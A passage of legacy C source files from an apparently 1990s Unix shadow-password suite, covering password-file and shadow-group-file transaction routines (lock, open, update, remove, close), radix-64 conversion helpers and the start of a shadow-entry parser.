	 * all changes to be "aborted".
	 */

	if (isopen) {
		open_modes = O_RDONLY;
		if (! pw_close ())
			return 0;
	}

	/*
	 * If the file is locked, we reset some flags and remove the lock
	 * file.  But we must be the process which created the lock in the
	 * first place.  fork() can mess us up since it causes two processes
	 * to hold the lock.
	 */

  	if (islocked) {
  		islocked = 0;
		if (lock_pid != getpid ())
			return 0;

		strcpy (lock, pw_filename);
		strcat (lock, ".lock");
		(void) unlink (lock);
  		return 1;
	}
	return 0;
}

/*
 * pw_open - open a password file
 *
 *	pw_open() encapsulates the open operation.  it returns
 *	TRUE or FALSE depending on the password file being
 *	properly opened.
 */

int
pw_open(mode)
	int mode;
{
	char	buf[8192];
	char	*cp;
	struct	pw_file_entry	*pwf;
	struct	passwd	*pwent;

	if (isopen || (mode != O_RDONLY && mode != O_RDWR))
		return 0;

	if (mode != O_RDONLY && ! islocked &&
			strcmp (pw_filename, PASSWD_FILE) == 0)
		return 0;

	if ((pwfp = fopen (pw_filename, mode == O_RDONLY ? "r":"r+")) == 0)
		return 0;

	__pwf_head = pwf_tail = pwf_cursor = 0;
	__pw_changed = 0;

	while (fgets (buf, sizeof buf, pwfp) != (char *) 0) {
		if ((cp = strrchr (buf, '\n')))
			*cp = '\0';

		if (! (pwf = (struct pw_file_entry *) malloc (sizeof *pwf)))
			goto fail;

		pwf->pwf_changed = 0;
		if ( !(pwf->pwf_line = strdup (buf)))
			goto fail;
		if ((pwent = sgetpwent (buf)) && ! (pwent = __pw_dup (pwent)))
			goto fail;

		pwf->pwf_entry = pwent;

		if (__pwf_head == 0) {
			__pwf_head = pwf_tail = pwf;
			pwf->pwf_next = 0;
		} else {
			pwf_tail->pwf_next = pwf;
			pwf->pwf_next = 0;
			pwf_tail = pwf;
		}
	}
	isopen++;
	open_modes = mode;

	return 1;

fail:
	fclose(pwfp);
	return 0;
}

/*
 * pw_close - close the password file
 *
 *	pw_close() outputs any modified password file entries and
 *	frees any allocated memory.
 */

int
pw_close()
{
	char	backup[BUFSIZ];
	char	newfile[BUFSIZ];
	int	errors = 0;
	struct	pw_file_entry *pwf;
	struct	stat	sb;

	if (! isopen) {
		errno = EINVAL;
		return 0;
	}
	if (islocked && lock_pid != getpid ()) {
		isopen = 0;
		islocked = 0;
		errno = EACCES;
		return 0;
	}
	strcpy (backup, pw_filename);
	strcat (backup, "-");
	strcpy (newfile, pw_filename);
	strcat (newfile, "+");

	/*
	 * Create a backup copy of the password file.
	 */

	if (open_modes == O_RDWR && __pw_changed) {

		/*
		 * POLICY: /etc/passwd
		 * Any backup copy of the password file shall have the
		 * same protections as the original.
		 */

		if (fstat (fileno (pwfp), &sb))
			return 0;

		if (create_backup_file(pwfp, backup, &sb))
			return 0;

		isopen = 0;
		(void) fclose (pwfp);

		/*
		 * POLICY: /etc/passwd
		 * The password file shall allow write access to
		 * privileged users only.
		 *
		 * The password file is opened with no access permissions
		 * to any user.  This allows the file to be changed to
		 * root ownership and then made readable by all users
		 * without ever giving any unprivileged user write access.
		 */

		pwfp = fopen_with_umask(newfile, "w", 0777);
		if (!pwfp)
			return 0;
		if (chown(newfile, sb.st_uid, sb.st_gid) ||
		    chmod(newfile, sb.st_mode))
			return 0;

		/*
		 * Check each member in the list and write out any elements
		 * that have been changed.
		 */

		for (pwf = __pwf_head;errors == 0 && pwf;pwf = pwf->pwf_next) {
			if (pwf->pwf_changed) {
				if (putpwent (pwf->pwf_entry, pwfp))
					errors++;
			} else {
				if (fputs (pwf->pwf_line, pwfp) == EOF)
					errors++;
				if (putc ('\n', pwfp) == EOF)
					errors++;
			}
		}
		if (fflush (pwfp))
			errors++;
		if (fclose (pwfp))
			errors++;

		if (errors) {
			unlink (newfile);
			return 0;
		}

		/*
		 * POLICY: /etc/passwd
		 * The password file shall be consistent at all times.
		 *
		 * The new password file is moved into place only after
		 * determining that the file was created without any
		 * errors occuring.
		 */

		if (rename (newfile, pw_filename))
			return 0;
		sync();
	} else 

		/*
		 * Just close the file -- there was nothing to change
		 */

		fclose (pwfp);

	pwfp = 0;

	/*
	 * Free up all of the memory in the linked list.
	 */

	while (__pwf_head != 0) {
		pwf = __pwf_head;
		__pwf_head = pwf->pwf_next;

		if (pwf->pwf_entry) {
			pw_free (pwf->pwf_entry);
			free (pwf->pwf_entry);
		}
		if (pwf->pwf_line)
			free (pwf->pwf_line);

		free (pwf);
	}
	pwf_tail = 0;
	isopen = 0;
	return 1;
}

int
pw_update(pwent)
	const struct passwd *pwent;
{
	struct	pw_file_entry	*pwf;
	struct	passwd	*npw;

	if (! isopen || open_modes == O_RDONLY) {
		errno = EINVAL;
		return 0;
	}
	for (pwf = __pwf_head;pwf != 0;pwf = pwf->pwf_next) {
		if (pwf->pwf_entry == 0)
			continue;

		if (strcmp (pwent->pw_name, pwf->pwf_entry->pw_name) != 0)
			continue;

		if (! (npw = __pw_dup (pwent)))
			return 0;
		else {
			pw_free (pwf->pwf_entry);
			*(pwf->pwf_entry) = *npw;
		}
		pwf->pwf_changed = 1;
		pwf_cursor = pwf;
		return __pw_changed = 1;
	}
	pwf = (struct pw_file_entry *) malloc (sizeof *pwf);
	if (!pwf)
		return 0;
	if (! (pwf->pwf_entry = __pw_dup (pwent)))
		return 0;

	pwf->pwf_changed = 1;
	pwf->pwf_next = 0;
	pwf->pwf_line = 0;

	if (pwf_tail)
		pwf_tail->pwf_next = pwf;

	if (! __pwf_head)
		__pwf_head = pwf;

	pwf_tail = pwf;

	return __pw_changed = 1;
}

int
pw_remove(name)
	const char *name;
{
	struct	pw_file_entry	*pwf;
	struct	pw_file_entry	*opwf;

	if (! isopen || open_modes == O_RDONLY) {
		errno = EINVAL;
		return 0;
	}
	for (opwf = 0, pwf = __pwf_head;pwf != 0;
			opwf = pwf, pwf = pwf->pwf_next) {
		if (! pwf->pwf_entry)
			continue;

		if (strcmp (name, pwf->pwf_entry->pw_name) != 0)
			continue;

		if (pwf == pwf_cursor)
			pwf_cursor = opwf;

		if (opwf != 0)
			opwf->pwf_next = pwf->pwf_next;
		else
			__pwf_head = pwf->pwf_next;

		if (pwf == pwf_tail)
			pwf_tail = opwf;

		return __pw_changed = 1;
	}
	errno = ENOENT;
	return 0;
}

const struct passwd *
pw_locate(name)
	const char *name;
{
	struct	pw_file_entry	*pwf;

	if (! isopen) {
		errno = EINVAL;
		return 0;
	}
	for (pwf = __pwf_head;pwf != 0;pwf = pwf->pwf_next) {
		if (pwf->pwf_entry == 0)
			continue;

		if (strcmp (name, pwf->pwf_entry->pw_name) == 0) {
			pwf_cursor = pwf;
			return pwf->pwf_entry;
		}
	}
	errno = ENOENT;
	return 0;
}

int
pw_rewind()
{
	if (! isopen) {
		errno = EINVAL;
		return 0;
	}
	pwf_cursor = 0;
	return 1;
}

const struct passwd *
pw_next()
{
	if (! isopen) {
		errno = EINVAL;
		return 0;
	}
	if (pwf_cursor == 0)
		pwf_cursor = __pwf_head;
	else
		pwf_cursor = pwf_cursor->pwf_next;

	while (pwf_cursor) {
		if (pwf_cursor->pwf_entry)
			return pwf_cursor->pwf_entry;

		pwf_cursor = pwf_cursor->pwf_next;
	}
	return 0;
}
/*
 * Copyright 1989 - 1992, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: rad64.c,v 1.2 1996/09/25 03:19:53 marekm Exp $")

/*
 * c64i - convert a radix 64 character to an integer
 */

int
c64i(c)
	char c;
{
	if (c == '.')
		return (0);

	if (c == '/')
		return (1);

	if (c >= '0' && c <= '9')
		return (c - '0' + 2);

	if (c >= 'A' && c <= 'Z')
		return (c - 'A' + 12);

	if (c >= 'a' && c <= 'z')
		return (c - 'a' + 38);
	else
		return (-1);
}

/*
 * i64c - convert an integer to a radix 64 character
 */

int
i64c(i)
	int i;
{
	if (i <= 0)
		return ('.');

	if (i == 1)
		return ('/');

	if (i >= 2 && i < 12)
		return ('0' - 2 + i);

	if (i >= 12 && i < 38)
		return ('A' - 12 + i);

	if (i >= 38 && i < 63)
		return ('a' - 38 + i);

	return ('z');
}

#ifdef NEED_AL64

/*
 * l64a - convert a long to a string of radix 64 characters
 */

char *
l64a(l)
	long l;
{
	static	char	buf[8];
	int	i = 0;

	if (l < 0L)
		return ((char *) 0);

	do {
		buf[i++] = i64c ((int) (l % 64));
		buf[i] = '\0';
	} while (l /= 64L, l > 0 && i < 6);

	return (buf);
}

/*
 * a64l - convert a radix 64 string to a long integer
 */

long
a64l(s)
	char *s;
{
	int	i;
	long	value;
	long	shift = 0;

	for (i = 0, value = 0L;i < 6 && *s;s++) {
		value += (c64i (*s) << shift);
		shift += 6;
	}
	return (value);
}

#endif /* NEED_A64L */
/*
 * Copyright 1990 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *	This file implements a transaction oriented shadow group
 *	database library.  The shadow group file is updated one
 *	entry at a time.  After each transaction the file must be
 *	logically closed and transferred to the existing shadow
 *	group file.  The sequence of events is
 *
 *	sgr_lock			-- lock shadow group file
 *	sgr_open			-- logically open shadow group file
 *	while transaction to process
 *		sgr_(locate,update,remove) -- perform transaction
 *	done
 *	sgr_close			-- commit transactions
 *	sgr_unlock			-- remove shadow group lock
 */

#include <config.h>

#ifdef	SHADOWGRP /*{*/

#include "rcsid.h"
RCSID("$Id: sgroupio.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <signal.h>
#include "prototypes.h"
#include "defines.h"

#define NEED_SG_FILE_ENTRY
#include "sgroupio.h"

static	int	islocked;
static	int	isopen;
static	int	open_modes;
static	FILE	*sgrfp;

struct	sg_file_entry	*__sgr_head;
static	struct	sg_file_entry	*sgr_tail;
static	struct	sg_file_entry	*sgr_cursor;
int	__sg_changed;
static	int	lock_pid;

#define	SG_LOCK	"/etc/gshadow.lock"
#define	GR_TEMP "/etc/gshadow.%d"

static	char	sg_filename[BUFSIZ] = SGROUP_FILE ;

extern	char	*strdup();
extern	struct	sgrp	*sgetsgent();
extern	char	*fgetsx();
extern	char	*malloc();
extern int do_lock_file();
extern FILE *fopen_with_umask();

/*
 * __sgr_dup - duplicate a shadow group file entry
 *
 *	__sgr_dup() accepts a pointer to a shadow group file entry and
 *	returns a pointer to a shadow group file entry in allocated memory.
 */

struct sgrp *
__sgr_dup (sgrent)
	const struct sgrp *sgrent;
{
	struct	sgrp	*sgr;
	int	i;

	if (! (sgr = (struct sgrp *) malloc (sizeof *sgr)))
		return 0;

	if ((sgr->sg_name = strdup (sgrent->sg_name)) == 0 ||
			(sgr->sg_passwd = strdup (sgrent->sg_passwd)) == 0)
		return 0;

	for (i = 0;sgrent->sg_mem[i];i++)
		;

	if (! (sgr->sg_mem = (char **) malloc (sizeof (char *) * (i + 1))))
		return 0;
	for (i = 0;sgrent->sg_mem[i];i++)
		if (! (sgr->sg_mem[i] = strdup (sgrent->sg_mem[i])))
			return 0;

	sgr->sg_mem[i] = 0;

	for (i = 0;sgrent->sg_adm[i];i++)
		;

	if (! (sgr->sg_adm = (char **) malloc (sizeof (char *) * (i + 1))))
		return 0;
	for (i = 0;sgrent->sg_adm[i];i++)
		if (! (sgr->sg_adm[i] = strdup (sgrent->sg_adm[i])))
			return 0;

	sgr->sg_adm[i] = 0;

	return sgr;
}

/*
 * sgr_free - free a dynamically allocated shadow group file entry
 *
 *	sgr_free() frees up the memory which was allocated for the
 *	pointed to entry.
 */

static void
sgr_free (sgrent)
	const struct sgrp *sgrent;
{
	int	i;

	free (sgrent->sg_name);
	free (sgrent->sg_passwd);

	for (i = 0;sgrent->sg_mem[i];i++)
		free (sgrent->sg_mem[i]);

	free (sgrent->sg_mem);

	for (i = 0;sgrent->sg_adm[i];i++)
		free (sgrent->sg_adm[i]);

	free (sgrent->sg_adm);
}

/*
 * sgr_name - change the name of the shadow group file
 */

int
sgr_name (name)
	const char *name;
{
	if (isopen || (int) strlen (name) > (BUFSIZ-10))
		return -1;

	strcpy (sg_filename, name);
	return 0;
}

/*
 * sgr_lock - lock a shadow group file
 *
 *	sgr_lock() encapsulates the lock operation.  it returns
 *	TRUE or FALSE depending on the shadow group file being
 *	properly locked.  the lock is set by creating a semaphore
 *	file, SG_LOCK.
 */

int
sgr_lock ()
{
	char	file[BUFSIZ];

	if (islocked)
		return 1;

	if (strcmp (sg_filename, SGROUP_FILE) != 0)
		return 0;

	sprintf (file, GR_TEMP, lock_pid = getpid ());

	/*
	 * The rest is common to all four files (see commonio.c).  --marekm
	 */

	if (do_lock_file(file, SG_LOCK)) {
		islocked = 1;
		return 1;
	}

	return 0;
}

/*
 * sgr_unlock - logically unlock a shadow group file
 *
 *	sgr_unlock() removes the lock which was set by an earlier
 *	invocation of sgr_lock().
 */

int
sgr_unlock ()
{
	if (isopen) {
		open_modes = O_RDONLY;
		if (! sgr_close ())
			return 0;
	}
	if (islocked) {
		islocked = 0;
		if (lock_pid != getpid ())
			return 0;

		(void) unlink (SG_LOCK);
		return 1;
	}
	return 0;
}

/*
 * sgr_open - open a shadow group file
 *
 *	sgr_open() encapsulates the open operation.  it returns
 *	TRUE or FALSE depending on the shadow group file being
 *	properly opened.
 */

int
sgr_open (mode)
	int mode;
{
	char	buf[8192];
	char	*cp;
	struct	sg_file_entry	*sgrf;
	struct	sgrp	*sgrent;

	if (isopen || (mode != O_RDONLY && mode != O_RDWR))
		return 0;

	if (mode != O_RDONLY && ! islocked &&
			strcmp (sg_filename, SGROUP_FILE) == 0)
		return 0;

	if ((sgrfp = fopen (sg_filename, mode == O_RDONLY ? "r":"r+")) == 0)
		return 0;

	__sgr_head = sgr_tail = sgr_cursor = 0;
	__sg_changed = 0;

	while (fgetsx (buf, sizeof buf, sgrfp) != (char *) 0) {
		if ((cp = strrchr (buf, '\n')))
			*cp = '\0';

		if (! (sgrf = (struct sg_file_entry *) malloc (sizeof *sgrf)))
			goto fail;

		sgrf->sgr_changed = 0;
		if (! (sgrf->sgr_line = strdup (buf)))
			goto fail;
		if ((sgrent = sgetsgent (buf)) && ! (sgrent = __sgr_dup (sgrent)))
			goto fail;

		sgrf->sgr_entry = sgrent;

		if (__sgr_head == 0) {
			__sgr_head = sgr_tail = sgrf;
			sgrf->sgr_next = 0;
		} else {
			sgr_tail->sgr_next = sgrf;
			sgrf->sgr_next = 0;
			sgr_tail = sgrf;
		}
	}
	isopen++;
	open_modes = mode;

	return 1;

fail:
	fclose(sgrfp);
	return 0;
}

/*
 * sgr_close - close the shadow group file
 *
 *	sgr_close() outputs any modified shadow group file entries and
 *	frees any allocated memory.
 */

int
sgr_close ()
{
	char	backup[BUFSIZ];
	char	newfile[BUFSIZ];
	int	errors = 0;
	struct	sg_file_entry *sgrf;
	struct	stat	sb;

	if (! isopen) {
		errno = EINVAL;
		return 0;
	}
	if (islocked && lock_pid != getpid ()) {
		isopen = 0;
		islocked = 0;
		errno = EACCES;
		return 0;
	}
	strcpy (backup, sg_filename);
	strcat (backup, "-");
	strcpy (newfile, sg_filename);
	strcat (newfile, "+");

	/*
	 * Create a backup copy of the shadow group file.
	 */

	if (open_modes == O_RDWR && __sg_changed) {

		/*
		 * POLICY: /etc/gshadow
		 * Any backup copy of the shadow group file shall have
		 * the same protections as the original.
		 *
		 * Get the permissions from the old file and apply them
		 * to the backup file.
		 */

		if (fstat (fileno (sgrfp), &sb))
			return 0;

		if (create_backup_file(sgrfp, backup, &sb))
			return 0;

		isopen = 0;
		(void) fclose (sgrfp);

		/*
		 * POLICY: /etc/gshadow
		 * The group file shall allow read and write access to
		 * privileged users only.
		 *
		 * The group file is opened with no access permissions
		 * to any user.  This allows the file to be changed to
		 * root ownership and then made readable by the owner
		 * without ever giving any unprivileged user write access.
		 */

		sgrfp = fopen_with_umask(newfile, "w", 0777);
		if (!sgrfp)
			return 0;
		if (chown(newfile, sb.st_uid, sb.st_gid) ||
		    chmod(newfile, sb.st_mode))
			return 0;

		/*
		 * Check each member in the list and write out any elements
		 * that have been changed.
		 */

		for (sgrf = __sgr_head;! errors && sgrf;sgrf = sgrf->sgr_next) {
			if (sgrf->sgr_changed) {
				if (putsgent (sgrf->sgr_entry, sgrfp) == -1)
					errors++;
			} else {
				if (fputsx (sgrf->sgr_line, sgrfp) == -1)
					errors++;

				if (putc ('\n', sgrfp) == EOF)
					errors++;
			}
		}
		if (fflush (sgrfp))
			errors++;
		if (fclose (sgrfp))
			errors++;

		if (errors) {
			unlink (newfile);
			return 0;
		}

		/*
		 * POLICY: /etc/gshadow
		 * The shadow group file shall be consistent at all
		 * times.
		 *
		 * The new group file is moved into place only after
		 * determining that the file was created without any
		 * errors occuring.
		 */

		if (rename (newfile, sg_filename))
			return 0;
		sync();
	} else
		/*
		 * Just close the file -- there was nothing to change
		 */

		fclose (sgrfp);

	sgrfp = 0;

	/*
	 * Free up all of the memory in the linked list.
	 */

	while (__sgr_head != 0) {
		sgrf = __sgr_head;
		__sgr_head = sgrf->sgr_next;

		if (sgrf->sgr_entry) {
			sgr_free (sgrf->sgr_entry);
			free (sgrf->sgr_entry);
		}
		if (sgrf->sgr_line)
			free (sgrf->sgr_line);

		free (sgrf);
	}
	sgr_tail = 0;
	isopen = 0;
	return 1;
}

int
sgr_update (sgrent)
	const struct sgrp *sgrent;
{
	struct	sg_file_entry	*sgrf;
	struct	sgrp	*nsgr;

	if (! isopen || open_modes == O_RDONLY) {
		errno = EINVAL;
		return 0;
	}
	for (sgrf = __sgr_head;sgrf != 0;sgrf = sgrf->sgr_next) {
		if (sgrf->sgr_entry == 0)
			continue;

		if (strcmp (sgrent->sg_name, sgrf->sgr_entry->sg_name) != 0)
			continue;

		if (! (nsgr = __sgr_dup (sgrent)))
			return 0;
		else {
			sgr_free (sgrf->sgr_entry);
			*(sgrf->sgr_entry) = *nsgr;
		}
		sgrf->sgr_changed = 1;
		sgr_cursor = sgrf;
		return __sg_changed = 1;
	}
	sgrf = (struct sg_file_entry *) malloc (sizeof *sgrf);
	if (! (sgrf->sgr_entry = __sgr_dup (sgrent)))
		return 0;

	sgrf->sgr_changed = 1;
	sgrf->sgr_next = 0;
	sgrf->sgr_line = 0;

	if (sgr_tail)
		sgr_tail->sgr_next = sgrf;

	if (! __sgr_head)
		__sgr_head = sgrf;

	sgr_tail = sgrf;

	return __sg_changed = 1;
}

int
sgr_remove (name)
	const char *name;
{
	struct	sg_file_entry	*sgrf;
	struct	sg_file_entry	*osgrf;

	if (! isopen || open_modes == O_RDONLY) {
		errno = EINVAL;
		return 0;
	}
	for (osgrf = 0, sgrf = __sgr_head;sgrf != 0;
			osgrf = sgrf, sgrf = sgrf->sgr_next) {
		if (! sgrf->sgr_entry)
			continue;

		if (strcmp (name, sgrf->sgr_entry->sg_name) != 0)
			continue;

		if (sgrf == sgr_cursor)
			sgr_cursor = osgrf;

		if (osgrf != 0)
			osgrf->sgr_next = sgrf->sgr_next;
		else
			__sgr_head = sgrf->sgr_next;

		if (sgrf == sgr_tail)
			sgr_tail = osgrf;

		return __sg_changed = 1;
	}
	errno = ENOENT;
	return 0;
}

const struct sgrp *
sgr_locate (name)
	const char *name;
{
	struct	sg_file_entry	*sgrf;

	if (! isopen) {
		errno = EINVAL;
		return 0;
	}
	for (sgrf = __sgr_head;sgrf != 0;sgrf = sgrf->sgr_next) {
		if (sgrf->sgr_entry == 0)
			continue;

		if (strcmp (name, sgrf->sgr_entry->sg_name) == 0) {
			sgr_cursor = sgrf;
			return sgrf->sgr_entry;
		}
	}
	errno = ENOENT;
	return 0;
}

int
sgr_rewind ()
{
	if (! isopen) {
		errno = EINVAL;
		return 0;
	}
	sgr_cursor = 0;
	return 1;
}

const struct sgrp *
sgr_next ()
{
	if (! isopen) {
		errno = EINVAL;
		return 0;
	}
	if (sgr_cursor == 0)
		sgr_cursor = __sgr_head;
	else
		sgr_cursor = sgr_cursor->sgr_next;

	while (sgr_cursor) {
		if (sgr_cursor->sgr_entry)
			return sgr_cursor->sgr_entry;

		sgr_cursor = sgr_cursor->sgr_next;
	}
	return 0;
}
#endif /*}*/
/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

/* Newer versions of Linux libc already have shadow support.  */
#if defined(SHADOWPWD) && !defined(HAVE_GETSPNAM)	/*{*/

#include "rcsid.h"
RCSID("$Id: shadow.c,v 1.1.1.1 1996/08/10 07:59:51 marekm Exp $")

#include <sys/types.h>
#include "prototypes.h"
#include "defines.h"
#include <stdio.h>

#ifdef	NDBM
#include <ndbm.h>
#include <fcntl.h>
DBM	*sp_dbm;
int	sp_dbm_mode = -1;
static	int	dbmopened;
static	int	dbmerror;
#endif

#ifdef	USE_NIS
static	int	nis_used;
static	int	nis_ignore;
static	enum	{ native, start, middle, native2 } nis_state;
static	int	nis_bound;
static	char	*nis_domain;
static	char	*nis_key;
static	int	nis_keylen;
static	char	*nis_val;
static	int	nis_vallen;
#define	IS_NISCHAR(c) ((c)=='+')
#endif

static	FILE	*shadow;
static	char	spwbuf[BUFSIZ];
static	struct	spwd	spwd;

#define	FIELDS	9
#define	OFIELDS	5

#ifdef	USE_NIS

/*
 * __setspNIS - turn on or off NIS searches
 */

void
__setspNIS (flag)
int	flag;
{
	nis_ignore = ! flag;

	if (nis_ignore)
		nis_used = 0;
}

/*
 * bind_nis - bind to NIS server
 */

static int
bind_nis ()
{
	if (yp_get_default_domain (&nis_domain))
		return -1;

	nis_bound = 1;
	return 0;
}
#endif

/*
 * setspent - initialize access to shadow text and DBM files
 */

void
setspent ()
{
	if (shadow)
		rewind(shadow);
	else
		shadow = fopen(SHADOW_FILE, "r");

#ifdef	USE_NIS
	nis_state = native;
#endif

	/*
	 * Attempt to open the DBM files if they have never been opened
	 * and an error has never been returned.
	 */

#ifdef NDBM
	if (! dbmerror && ! dbmopened) {
		int	mode;
		char	dbmfiles[BUFSIZ];

		strcpy (dbmfiles, SHADOW_PAG_FILE);

		if (sp_dbm_mode == -1)
			mode = O_RDWR;
		else
			mode = (sp_dbm_mode == O_RDWR) ? O_RDWR:O_RDONLY;

		if (! (sp_dbm = dbm_open (SHADOW_FILE, mode, 0)))
			dbmerror = 1;
		else
			dbmopened = 1;
	}
#endif
}

/*
 * endspent - terminate access to shadow text and DBM files
 */

void
endspent ()
{
	if (shadow)
		(void) fclose (shadow);

	shadow = (FILE *) 0;
#ifdef	NDBM
	if (dbmopened && sp_dbm) {
		dbm_close (sp_dbm);
		sp_dbm = 0;
	}
	dbmopened = 0;
	dbmerror = 0;
#endif
}

/*
 * sgetspent - convert string in shadow file format to (struct spwd *)
 */

static struct spwd *
sgetspent (string)
	const char *string;
{
	char	*fields[FIELDS];
	char	*cp;
	char	*cpp;
	int	i;

	/*
	 * Copy string to local buffer.  It has to be tokenized and we
	 * have to do that to our private copy.
	 */

	strncpy (spwbuf, string, BUFSIZ-1);
	spwbuf[BUFSIZ-1] = '\0';

	if ((cp = strrchr (spwbuf, '\n')))
		*cp = '\0';

	/*
	 * Tokenize the string into colon separated fields.  Allow up to
	 * FIELDS different fields.
	 */

	for (cp = spwbuf, i = 0;*cp && i < FIELDS;i++) {
		fields[i] = cp;
		while (*cp && *cp != ':')
			cp++;

		if (*cp)
			*cp++ = '\0';
	}

	/*
	 * It is acceptable for the last SVR4 field to be blank.  This
	 * results in the loop being terminated early.  In which case,
	 * we just make the last field be blank and be done with it.
	 */

	if (i == (FIELDS-1))
		fields[i++] = cp;

	if ((cp && *cp) || (i != FIELDS && i != OFIELDS))
		return 0;

	/*
	 * Start populating the structure.  The fields are all in
	 * static storage, as is the structure we pass back.  If we
	 * ever see a name with '+' as the first character, we try
	 * to turn on NIS processing.
	 */

	spwd.sp_namp = fields[0];
#ifdef	USE_NIS
	if (IS_NISCHAR (fields[0][0]))
		nis_used = 1;
#endif
	spwd.sp_pwdp = fields[1];

	/*
	 * Get the last changed date.  For all of the integer fields,
	 * we check for proper format.  It is an error to have an
	 * incorrectly formatted number, unless we are using NIS.
	 */

	if ((spwd.sp_lstchg = strtol (fields[2], &cpp, 10)) == 0 && *cpp) {
#ifdef	USE_NIS
		if (! nis_used)
			return 0;
		else
			spwd.sp_lstchg = -1;
#else
		return 0;
#endif
	} else if (fields[2][0] == '\0')
		spwd.sp_lstchg = -1;

	/*
	 * Get the minimum period between password changes.
	 */

	if ((spwd.sp_min = strtol (fields[3], &cpp, 10)) == 0 && *cpp) {
#ifdef	USE_NIS
		if (! nis_used)
			return 0;
		else
			spwd.sp_min = -1;
#else
		return 0;
#endif
	} else if (fields[3][0] == '\0')
		spwd.sp_min = -1;

	/*
	 * Get the maximum number of days a password is valid.
	 */

	if ((spwd.sp_max = strtol (fields[4], &cpp, 10)) == 0 && *cpp) {
#ifdef	USE_NIS
		if (! nis_used)
			return 0;
		else
